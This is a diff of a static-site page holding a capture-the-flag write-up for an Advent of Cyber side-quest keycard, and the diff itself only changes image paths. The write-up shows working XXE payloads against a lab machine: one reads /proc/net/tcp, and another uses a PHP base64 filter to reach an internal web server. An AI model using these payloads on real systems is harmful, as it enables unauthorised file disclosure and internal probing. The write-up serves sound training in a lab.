@@ -11,7 +11,7 @@
     <article><div><h1>Advent of Cyber Side Quest - L2 Keycard</h1><p>Keycard Location: Day 5 Target IP: 10.10.207.217</p><p>Considering the hint that was given it suggests that there are open ports, however, just from running an nmap scan of the target system, we cannot see anything, this is assumed since also in the hint we are told the system was hardened.</p><pre><code>PORT      STATE    SERVICE
 22/tcp    open     ssh
 80/tcp    open     http
-</code></pre><p>We can see that there is nothing visible that we can access from the outside. However, if we remember the task from the room, we are able to understand that we have insider access to the target system through the XXE (XML External Entity) vulnerability.</p><p>Whilst there may not be any public facing ports that are open, we are able to search the target system from the inside for any local ports that are open.</p><p>To do so we will capture the POST request in Burpsuite just like the task originally asked us to:</p><p><img src="/images/Pasted image 20250101011957.png" alt="Pasted image 20250101011957.png"></img></p><p>Now, we need to find a file that shows the local IP addresses/ports that are available. Searching Google we find that we can look at the file: <code>/proc/net/tcp</code></p><pre><code><!--?xml version="1.0" ?-->
+</code></pre><p>We can see that there is nothing visible that we can access from the outside. However, if we remember the task from the room, we are able to understand that we have insider access to the target system through the XXE (XML External Entity) vulnerability.</p><p>Whilst there may not be any public facing ports that are open, we are able to search the target system from the inside for any local ports that are open.</p><p>To do so we will capture the POST request in Burpsuite just like the task originally asked us to:</p><p><img src="/static-site-generator/images/Pasted image 20250101011957.png" alt="Pasted image 20250101011957.png"></img></p><p>Now, we need to find a file that shows the local IP addresses/ports that are available. Searching Google we find that we can look at the file: <code>/proc/net/tcp</code></p><pre><code><!--?xml version="1.0" ?-->
 <!DOCTYPE foo [<!ENTITY payload SYSTEM "/proc/net/tcp"> ]>
 <wishlist>
   <user_id>1</user_id>
@@ -98,7 +98,7 @@ if len(rv) > 0:
        <product_id>&payload;</product_id>
      </item>
 </wishlist>
-</code></pre><p>From this we receive the following message:</p><p><img src="/images/Pasted image 20250102161816.png" alt="Pasted image 20250102161816.png"></img></p><p>This may mean that there are some characters in the XML that the system cannot understand, to ensure that we make it in a format that the system understands, we will encode it using base64 using the php application:</p><pre><code><!--?xml version="1.0" ?-->
+</code></pre><p>From this we receive the following message:</p><p><img src="/static-site-generator/images/Pasted image 20250102161816.png" alt="Pasted image 20250102161816.png"></img></p><p>This may mean that there are some characters in the XML that the system cannot understand, to ensure that we make it in a format that the system understands, we will encode it using base64 using the php application:</p><pre><code><!--?xml version="1.0" ?-->
 <!DOCTYPE foo [<!ENTITY payload SYSTEM "php://filter/convert.base64-encode/resource=http://localhost:8080/"> ]>
 <wishlist>
   <user_id>1</user_id>
@@ -106,7 +106,7 @@ if len(rv) > 0:
        <product_id>&payload;</product_id>
      </item>
 </wishlist>
-</code></pre><p>From this we receive the following base64 response:</p><p><img src="/images/Pasted image 20250102162912.png" alt="Pasted image 20250102162912.png"></img></p><p>Now sending the response to decoder we receive the following:</p><pre><code><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+</code></pre><p>From this we receive the following base64 response:</p><p><img src="/static-site-generator/images/Pasted image 20250102162912.png" alt="Pasted image 20250102162912.png"></img></p><p>Now sending the response to decoder we receive the following:</p><pre><code><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
 <html>
  <head>
   <title>Index of /</title>
@@ -129,8 +129,8 @@ if len(rv) > 0:
        <product_id>&payload;</product_id>
      </item>
 </wishlist>
-</code></pre><p>Response:</p><p><img src="/images/Pasted image 20250102163604.png" alt="Pasted image 20250102163604.png"></img></p><p>Decoded:</p><pre><code>10.13.27.113 - - [18/Nov/2024:14:43:35 +0000] "GET /k3yZZZZZZZZZ/t2_sm1L3_4nD_w4v3_boyS.png HTTP/1.1" 200 194 "http://10.10.218.19/product.php?id=1" "Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0"
-</code></pre><p>Here we receive a HTTP GET request for an interesting PNG at a specific directory and file, by heading to this file on our Wareville application we see the keycard:</p><p><img src="/images/Pasted image 20250102163830.png" alt="Pasted image 20250102163830.png"></img></p><p>Now we can disable the firewall using the password.</p></div></article>
+</code></pre><p>Response:</p><p><img src="/static-site-generator/images/Pasted image 20250102163604.png" alt="Pasted image 20250102163604.png"></img></p><p>Decoded:</p><pre><code>10.13.27.113 - - [18/Nov/2024:14:43:35 +0000] "GET /k3yZZZZZZZZZ/t2_sm1L3_4nD_w4v3_boyS.png HTTP/1.1" 200 194 "http://10.10.218.19/product.php?id=1" "Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0"
+</code></pre><p>Here we receive a HTTP GET request for an interesting PNG at a specific directory and file, by heading to this file on our Wareville application we see the keycard:</p><p><img src="/static-site-generator/images/Pasted image 20250102163830.png" alt="Pasted image 20250102163830.png"></img></p><p>Now we can disable the firewall using the password.</p></div></article>
     <a href="/">Back to Home</a>
   </body>
   <hr>
